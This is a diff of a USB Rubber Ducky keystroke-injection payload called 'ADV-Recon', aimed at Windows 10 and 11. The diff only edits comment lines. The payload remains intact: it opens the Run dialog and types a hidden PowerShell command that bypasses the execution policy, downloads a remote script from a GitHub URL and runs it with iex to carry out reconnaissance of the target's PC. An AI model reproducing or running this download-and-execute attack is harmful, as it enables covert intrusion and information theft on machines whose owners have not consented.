@@ -1,11 +1,11 @@
 REM     Title: ADV-Recon
-REM
+
 REM     Author: I am Jakoby
-REM
+
 REM     Description: This payload is meant to do an advanced recon of the targets PC. See README.md file for more details.
-REM
+
 REM     Target: Windows 10, 11
-REM
+
 GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass $db='';iwr https://raw.githubusercontent.com/I-Am-Jakoby/1/main/ADV-Recon.ps1 | iex
